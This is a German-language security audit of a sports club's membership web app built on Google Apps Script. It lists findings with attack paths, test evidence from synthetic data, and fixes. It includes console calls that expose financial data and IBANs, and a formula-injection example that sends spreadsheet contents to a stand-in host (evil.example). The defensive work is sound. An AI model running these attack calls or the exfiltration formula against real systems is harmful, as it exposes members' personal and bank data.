# Sicherheitsprüfung – Stand Welle 2 (25.10.2026)

Geprüft wurde der Code-Stand nach Welle 2 (Commit `46eb710`) gegen `docs/Sicherheitsregeln.md` (Teil A und D) und die
Rollenmatrix in `src/lib/rechte.js`. Jede Aussage mit „Nachweis“ wurde mit den echten Servermodulen in Node gegen
`test/hilfe/gas-fakes.js` und den synthetischen Verein (`test/daten/generator.js`, 300 Mitglieder) **ausgeführt**.
Die Skripte lagen außerhalb des Repos. Zeilennummern beziehen sich auf diesen Stand; parallele Änderungen können sie
verschieben.

## Zusammenfassung

Die Grundarchitektur hält:
- Jede öffentliche Funktion läuft über `Api.ausfuehren` bzw. `Zugriff.nurFunktionskonto`.
- Der Snapshot ist IBAN-frei und nach Zeilen und Feldern geschnitten.
- Ein Abteilungsleiter kann in 18 geprüften Angriffen mit fremden IDs nichts schreiben.
- Es gibt kein `innerHTML` mit Daten.

Gefunden wurden:

| Schwere | Anzahl |
|---|---|
| kritisch | 1 |
| hoch | 2 |
| mittel | 4 |
| niedrig | 5 |
| Hinweis | 1 |

Die drei schwersten Befunde (K1, H1, H2) sind jeweils mit wenigen Zeilen behebbar und sollten vor dem Go-live erledigt sein.

## Befundtabelle

| Nr. | Schwere | Ort | Kurzbeschreibung |
|---|---|---|---|
| K1 | **kritisch** | `src/api/Finanzen.js:127`, `src/modul/Finanzen.js:736` | `apiFinanzenBuchhaltung` braucht nur die Aktion `export`. Abteilungs- und Jugendleiter bekommen damit alle Sollstellungen des Vereins mit Kontoinhaber, Mandatsreferenz, Status und Rücklastschriftgrund. |
| H1 | **hoch** | `src/modul/Mitglieder.js:560 ff.` (`zuordnen`) | Zuordnen nach Exaktsuche hat keine Ratenbegrenzung. Ein Abteilungsleiter zählt die Mitgliedsnummern durch, hängt fremde Mitglieder an seine Abteilung und sieht danach ihre Kontaktdaten. |
| H2 | **hoch** | `src/Api.js:39–40`, `src/Datenzugriff.js` (`aktualisieren` → `Fehler.konflikt(alt)`) | Die Konflikt-Antwort liefert den vollständigen Datensatz ohne Feldschnitt. Beim Beitragskonto steht darin die IBAN im Klartext, ohne Protokolleintrag. Das umgeht `iban_aufdecken` und den Audit. |
| M1 | mittel | `src/modul/Verwaltung.js:266` (`konfigSpeichern`) | Formel-Injektion in `_Konfig`: Freitextwerte wie `=IMPORTXML(…)` werden ohne Formelschutz geschrieben. |
| M2 | mittel | `src/Protokoll.js:45` + 7 Aufrufer ohne Sperre | `Protokoll.schreibe` außerhalb von `DB.mitSperre`. Gleichzeitige Aufrufe schreiben in dieselbe Zeile, Audit-Einträge gehen verloren und `protokoll_id` kommt doppelt vor. |
| M3 | mittel | `src/modul/Mitglieder.js:515–545` | Exaktsuche: Allein über die Mitgliedsnummer lassen sich 720 Nummern pro Tag durchsuchen (Name und Geburtsjahr). Der Zähler ist nicht gesperrt und lässt sich mit parallelen Aufrufen überlisten. |
| M4 | mittel | `src/Einstieg.js:158` (`triggerEinrichten`) | Für die Protokoll-Bereinigung (`protokollBereinigenTrigger`) und die Löschfrist von `_Messung` gibt es noch keinen Trigger (D4, A10). |
| N1 | niedrig | `src/api/Finanzen.js:132`, `src/api/Berichte.js:47` | Export-Protokollierung: AL und JL können über `apiFinanzenExportVermerken` und `apiBerichteExportProtokollieren` beliebigen Freitext ins Protokoll schreiben (Log-Fälschung). Exporte im Browser lassen sich ohne Protokoll erzeugen. |
| N2 | niedrig | `src/modul/Mitglieder.js` (`speichern`) | Mitgliederverwalter und Vorstand können `anonymisiert`, `verarbeitung_eingeschraenkt`, `loeschbar_ab` und `sperre_grund` direkt setzen und damit den Datenschutz-Ablauf und dessen Protokoll umgehen. |
| N3 | niedrig | `src/Zugriff.js` (Benutzer-Cache 300 s) | Wird eine Benutzerzeile direkt im Sheet entzogen, wirkt das erst nach bis zu 5 Minuten. Über die Oberfläche wirkt es sofort. |
| N4 | niedrig | `src/Messung.js:68` (`clientWerte`) | Jeder aktive Benutzer kann pro Aufruf 100 erfundene Messwerte einspeisen und echte aus dem Puffer verdrängen. Keine Personendaten. |
| N5 | niedrig | `src/lib/blsv.js:202` (`csv`) | Die BLSV-CSV hat weder Feld-Escaping noch Formelschutz (Abteilungsnamen aus den Stammdaten). |
| H | Hinweis | Betrieb | Wer sich mit dem Funktionskonto an der WebApp anmeldet, besteht `nurFunktionskonto` und kann `setup`, `triggerEinrichten` und die Trigger-Funktionen aus der Browser-Konsole aufrufen. |

## Details

### K1 – Buchhaltungs-Export für Rollen ohne Finanzsicht (kritisch)
- **Angriffsweg:** Ein Abteilungsleiter oder Jugendleiter hat laut Matrix die Aktion `export`. In der Browser-Konsole:
  `google.script.run.withSuccessHandler(console.log).apiFinanzenBuchhaltung(2026)`.
- **Nachweis:** Beide Rollen bekommen `ok: true` mit 182 Zeilen, z. B.
  `{"konto":1,"inhaber":"Mittermeier, Markus","zahlweg":"Überweisung","soll":100,"status":"offen",…}`.
  Das sind Finanzdaten (Sichtklasse `finanz`), die diesen Rollen nie zustehen. Betroffen ist der ganze Verein, die
  Abteilungsgrenze greift nicht. Verstoß gegen A2 und die Rollenmatrix.
- **Fix:** In `src/api/Finanzen.js` die Aktion auf `konto_lesen` ändern und im Modul zusätzlich
  `Rechte.darf(ktx, 'export')` prüfen. Gleiches für `apiFinanzenExportVermerken` (siehe N1).
  Regressionstest: AL und JL → `art: 'zugriff'`.

### H1 – Zuordnen ohne Ratenbegrenzung macht fremde Mitglieder sichtbar (hoch)
- **Angriffsweg:** Ein Abteilungsleiter ruft in einer Schleife
  `apiMitgliedZuordnen({mitgliedsnummer: '0001'…'9999'}, <eigeneAbteilung>, 'passiv')` auf. Jede existierende aktive
  Nummer erzeugt eine passive Zugehörigkeit in seiner Abteilung, danach liefert der Snapshot die volle
  Kontaktsicht dieser Person. Die Exaktsuche ist auf 30 Anfragen pro Stunde begrenzt; `zuordnen` ruft `begrenze()` nicht
  auf und braucht keine vorherige Suche.
- **Nachweis:** Mit 700 Aufrufen hingen 112 Zuordnungen an der eigenen Abteilung. Die Sicht des Abteilungsleiters
  stieg von 158 auf 268 Personen, 234 davon mit Telefon oder E-Mail. Danach brach die Exaktsuche nach 31 Aufrufen
  ab, `zuordnen` lief unbegrenzt weiter.
- **Fix:**
  - `zuordnen` nur mit einem Treffer-Token aus einer unmittelbar vorangegangenen `sucheExakt` erlauben. Das Token
    liegt im Script-Cache, ist an die E-Mail gebunden, gilt 10 Minuten und nur einmal. `begrenze()` zusätzlich auch hier.
  - Wie M3: Nummer allein nicht genügen lassen.
  - Optional: Verwaltung warnen, wenn mehr als 10 Zuordnungen pro Tag von einem Benutzer kommen.

### H2 – Konflikt-Antwort ohne Feldschnitt, IBAN im Klartext (hoch)
- **Angriffsweg:** Der Mitgliederverwalter darf `konto_bearbeiten`. Er ruft
  `apiFinanzenKontoSpeichern(id, 99, {bemerkung:'x'})` mit absichtlich falscher Version auf. `DB.aktualisieren` wirft
  `Fehler.konflikt(alt)`, und `Api` gibt `aktuell` unverändert zurück.
- **Nachweis:** Die Antwort enthält
  `"aktuell":{"beitragskonto_id":3,…,"iban":"DE5074390000…","bic":"GENODEF1LH1","mandatsreferenz":…}`, ohne
  Protokolleintrag „eingesehen“. Damit lassen sich alle IBANs ohne Spur abziehen. Das widerspricht
  „Klartext-IBAN nur über `iban_aufdecken` mit Protokoll“.
- **Allgemeiner:** Jede Konflikt-Antwort umgeht `Rechte.schneide`. Bei den heutigen Rollen trifft das praktisch nur
  Beitragskonto/IBAN, weil die übrigen Tabs mit Bearbeitungsrecht ohnehin ganz sichtbar sind. Das wird zur
  Lücke, sobald eine Rolle Tabs bearbeiten darf, deren Felder sie nur teilweise sieht.
- **Fix:**
  - In `Api.ausfuehren` `fehler.aktuell` nicht mehr ausliefern. Der Browser lädt bei einem Konflikt ohnehin neu
    (`App.ladeNeu`, `client/kern.html`).
  - Alternativ `Fehler.konflikt(alt, tab)` und in `Api` per `Rechte.schneide(ktx, tab, aktuell)` schneiden, `iban`/`bic`
    dabei immer entfernen.

### M1 – Formel-Injektion in _Konfig (mittel)
- **Angriffsweg:** Wer `konfig_aendern` hat (Vorstand, MV), speichert z. B. als `verein_name` den Wert
  `=IMPORTXML("https://evil.example/?d="&A1,"//a")`. Der Typ „Text“ läuft im `default`-Zweig von `pruefeKonfig` ohne
  Formelschutz und wird per `setValue(String(neu))` geschrieben.
- **Nachweis:** Der Wert steht unverändert mit `=` am Anfang in `_Konfig`. In Google Sheets würde er als Formel
  ausgeführt; IMPORTXML/IMPORTDATA können Zellinhalte an fremde Server senden (A4, D5). Die Rolle ist zwar
  vertrauenswürdig, ein Tippfehler oder ein kompromittiertes Konto genügt aber.
- **Fix:** Wert über `Werte.zelleSchreiben(wert, {typ:'Text'})` schreiben oder gleich `Konfig.setze` nutzen, das den
  Formelschutz hat.

### M2 – Protokolleinträge ohne Sperre (mittel)
- **Ort:** `Protokoll.schreibe` liest `getLastRow()` und schreibt in die Zeile danach. Ohne Sperre rufen es auf:
  - `Zugriff.js:39` (Abweisung)
  - `modul/Berichte.js:29` (Export)
  - `modul/Ehrungen.js:149` (Export)
  - `modul/Mitglieder.js:544` (Exaktsuche)
  - `modul/Mitglieder.js:653` (Export)
  - `modul/Nachweise.js:207` (Export)
  - `modul/Verwaltung.js:378` (Snapshot neu)
- **Folge:** Laufen zwei Ausführungen gleichzeitig, schreiben beide in dieselbe Zeile. Ein Audit-Eintrag geht
  verloren und `protokoll_id` kommt doppelt vor (A7, A10). Den Fehlerfall habe ich nicht ausgeführt, er folgt
  direkt aus dem Code.
- **Fix:** `Protokoll.schreibe` intern in `DB.mitSperre(…)` kapseln (wiedereintrittsfähig, kostet nichts, wenn die
  Sperre schon gehalten wird).

### M3 – Aufzählbarkeit der Exaktsuche (mittel)
- **Weg:** `apiMitgliedSucheExakt({mitgliedsnummer})` liefert für jede aktive Nummer Name, Nummer und Geburtsjahr.
  Bei 30 Suchen pro Stunde ist der ganze Verein (~1.200) in rund 2 Tagen erfasst. Der Zähler
  (`CacheService`, lesen → +1 → schreiben) läuft ohne Sperre, parallele Aufrufe überschreiten das Limit.
- **Fix:**
  - Zur Nummer zusätzlich den Nachnamen verlangen (Mockup: „Nummer **oder** Nachname + Geburtsdatum“ → besser
    „Nummer + Nachname“ oder „Nachname + Geburtsdatum“).
  - Limit pro Tag, z. B. 20, und den Zähler unter `LockService`.
  - Auffällige Benutzer in der Verwaltung melden.

### M4 – Löschfristen für Protokoll und Messwerte nicht automatisiert (mittel)
`protokollBereinigenTrigger` gibt es, `triggerEinrichten` richtet ihn aber nicht ein. Für `_Messung` fehlen
Löschfrist und Löschlauf. D4 verlangt, dass Fristen technisch umgesetzt sind und die Zuständigkeit geklärt ist.
- **Fix:** In `triggerEinrichten` einen monatlichen Trigger anlegen, `_Messung` z. B. nach 3 Monaten leeren, die Frist
  in `Aufbewahrungsfrist` eintragen.

### N1 – Export-Protokoll: Freitext und Freiwilligkeit (niedrig)
- `apiFinanzenExportVermerken(liste, anzahl)` und `apiBerichteExportProtokollieren(liste, anzahl)` nehmen beliebigen
  Text bis 100 bzw. 500 Zeichen und brauchen nur `export`. Nachweis: Ein Abteilungsleiter schreibt erfolgreich
  einen Eintrag „Finanzen … exportiert“, obwohl er keine Finanzdaten sieht (Log-Fälschung).
- Exporte entstehen im Browser aus dem Snapshot. Der Vermerk ist ein eigener Aufruf, den man weglassen kann. Das
  ist ein Restrisiko der Architektur „lokal arbeiten“: Die Daten liegen ohnehin schon im Browser.
- **Fix:** Erlaubte Listennamen wie bei `Mitglieder.EXPORTARTEN` festlegen; `apiFinanzenExportVermerken` mit
  `konto_lesen`. Das Restrisiko in `docs/VERARBEITUNGSVERZEICHNIS.md` (TOM) benennen.

### N2 – Verwaltungsfelder über die normale Bearbeitung (niedrig)
Nachweis: `apiMitgliedSpeichern(id, v, {anonymisiert: true})` speichert für den MV `anonymisiert: true`. Die Person
verschwindet dann aus allen Sichten außer der Verwaltung, ohne Anonymisierungsplan und ohne Protokoll
„anonymisiert“. **Fix:** In `Mitglieder.speichern` die Felder `anonymisiert`, `anonymisiert_am`,
`verarbeitung_eingeschraenkt`, `sperre_grund` und `loeschbar_ab` entfernen. Sie dürfen nur über `Datenschutz.*`
geändert werden.

### N3 – Verzögerter Rechteentzug bei direkter Sheet-Bearbeitung (niedrig)
Der Benutzer-Cache gilt 300 s. Die Verwaltungsoberfläche ruft `Zugriff.vergessen()` auf. Wer Benutzer direkt im Sheet
deaktiviert, hat bis zu 5 Minuten Verzug. **Fix:** in `docs/BETRIEB.md` festhalten: „Rechte nur über die Oberfläche
ändern, sonst `Snapshot neu aufbauen`“.

### N4 – Messpuffer manipulierbar (niedrig)
Jeder aktive Benutzer kann über `apiClientMessungen` erfundene Werte einspeisen. Sie werden validiert (Name, Zahl)
und enthalten keine Personendaten, verfälschen aber die Messwerte. **Fix:** ein Aufruf pro Minute und Benutzer
oder höchstens 200 Werte pro Tag.

### N5 – BLSV-CSV ohne Escaping (niedrig)
`Blsv.csv` verbindet Werte mit `;`, ohne Anführungszeichen und ohne Formelschutz. Abteilungs- und Sportartnamen
kommen aus den Stammdaten (nur V/MV). **Fix:** dieselbe Zellfunktion wie `App.csv` (Anführungszeichen, `'` vor
`= + - @`).

### Hinweis – Funktionskonto nicht als Benutzerkonto verwenden
`nurFunktionskonto` prüft „aktiver Benutzer = Eigentümer“. Meldet sich jemand mit dem Funktionskonto an der WebApp
an (im synthetischen Verein ist `verwaltung@…` zugleich Mitgliederverwalter und Eigentümer), kann er Setup und
Trigger-Funktionen über `google.script.run` aufrufen. Das ist vertretbar, weil das Konto ohnehin Eigentümer ist.
**Empfehlung:** Die Mitgliederverwaltung arbeitet mit einem persönlichen Konto, das Funktionskonto nur für Betrieb und
Deployment; in `docs/BETRIEB.md` aufnehmen.

## Ohne Befund geprüft

1. **Öffentliche Funktionen:** Alle 92 Top-Level-Funktionen ohne `_` laufen über `Api.ausfuehren` (Rollenprüfung
   in jeder Funktion, A2) bzw. `Zugriff.nurFunktionskonto` (`setup`, `triggerEinrichten`, `messungSchreiben`,
   `snapshotWarmhalten`, `protokollBereinigenTrigger`). Die Aktionen passen zur Matrix; einzige Ausnahmen sind K1 und N1.
2. **Zeilenschutz beim Schreiben (Abteilungsleiter, ausgeführt):** abgewiesen werden jeweils fremde IDs bei
   - Zugehörigkeit beenden oder ändern, auch für eine sichtbare Person in fremder Abteilung;
   - Zugehörigkeit in fremder Abteilung anlegen;
   - Funktion beenden (fremd und Vereinsamt);
   - Funktion eintragen (Vereinsamt, fremde Abteilung, fremde Person);
   - Nachweis ändern, löschen oder erfassen bei fremder Person;
   - Zuordnen zu fremder Abteilung, Mitglied speichern, Auskunft, Ehrungen, Konto, IBAN, Benutzer.

   Umhängen per `mitglied_id`/`abteilung_id`/`funktionsart_id` in den Änderungsfunktionen wird verworfen; technische
   Felder (`version`, `geaendert_von`) aus dem Browser werden ignoriert.
3. **Berichte für Abteilungsleiter:** Geburtstage, Jubiläen, Bewegungen und Nachweise enthalten keine Person
   außerhalb seines Sichtkreises (ausgeführt). BLSV und Jahresvergleich werden fachlich abgewiesen.
4. **Snapshot:** Die Basis enthält keine IBAN/BIC (nur `iban_maskiert`). Abteilungsleiter bekommen keine Finanzlisten
   (auch nicht über `apiSnapshot(['finanzen'])`), Cache-Schlüssel sind fest im Server.
5. **Protokollansicht:** Kassier nur Finanz-Tabellen, IBAN alt/neu maskiert (ausgeführt), Abteilungsleiter abgewiesen.
6. **XSS:** In `src/client/*.html` gibt es kein `innerHTML`, `insertAdjacentHTML` oder `document.write`. Texte gehen
   über `textContent`, auch in `App.drucke` und im Auskunftsdruck. Links: `tel:`/`mailto:` mit festem Präfix.
   Impressum/Datenschutz nur mit `https://` (`App.sichereUrl`, Konfig-Prüfung).
7. **Einbettung in doGet:** JSON mit `<` → `<`, U+2028/2029 escaped. Keine Scriptlets in `<script>`
   (`check.js`), kein `ALLOWALL`, keine externen Ressourcen (`check.js`).
8. **SEPA-XML:** `escape()` für `& < > " '`, Zeichensatz-Bereinigung, Längenkürzung.
9. **Formelschutz:** Er gilt für alle Schreibwege über `Werte.zelleSchreiben` (`DB.einfuegen`/`aktualisieren`, Massenschreiben
   in Finanzen/Bereichsdaten), für `Protokoll` und `Konfig.setze`. Ausnahme ist M1. `App.csv` schützt im Browser.
10. **A3:** Keine Datei- oder Tab-IDs vom Client. `DB_ID` steht in den Script Properties; `apiVerwaltungStammdaten(tab)`
    prüft gegen eine feste Liste (`pruefeStammTab`).
11. **A5:** Drei Scopes (`spreadsheets`, `userinfo.email`, `script.scriptapp`), `check.js` erzwingt das.
12. **A9:** Interne Fehler gehen generisch mit Fehler-Nr. an den Client, Details nur über `console.error`. Fachliche
    Meldungen nennen keine Tab-Namen.
13. **Rechteausweitung:** `benutzer_verwalten` und `konfig_aendern` haben nur Vorstand und Mitgliederverwalter.
    Abteilungsleiter und Kassier können weder Benutzer noch `_Konfig` ändern. Der Selbstschutz gegen den Entzug der letzten
    Verwaltungsrolle ist vorhanden.

## Restrisiken und Annahmen
- [A] Beim Protokoll-Rennen (M2) gehe ich davon aus, dass Apps Script gleichzeitige Ausführungen desselben Projekts
  zulässt. Das ist dokumentiertes Verhalten; das Ausmaß ist bei wenigen Nutzern gering.
- [?] Ob `IMPORTXML` in einem Sheet, das nur das Funktionskonto öffnet, ohne Öffnen neu berechnet wird, weiß ich nicht.
  Der Schutz ist trotzdem nötig, weil das Sheet zur Wartung geöffnet wird.
- [A] Daten, die im Browser angekommen sind (Snapshot), kann der Nutzer immer kopieren. Die Export-Protokollierung
  dokumentiert nur, sie verhindert nichts (N1). Das ist eine bewusste Folge von „einmal laden, lokal arbeiten“.
- [?] Wie oft und wie gleichzeitig Google Ausführungen derselben WebApp zulässt (Quoten), habe ich nicht geprüft.
- Nebenbefund außerhalb des Auftrags, kein Sicherheitsproblem: `apiDatenschutzProtokoll(filter, seite)` zählt Seiten
  ab 0. Der Aufruf mit `seite = 1` liefert bei nur einer Seite eine leere Liste mit `gesamt: 1`; das sollte die
  Oberfläche berücksichtigen.
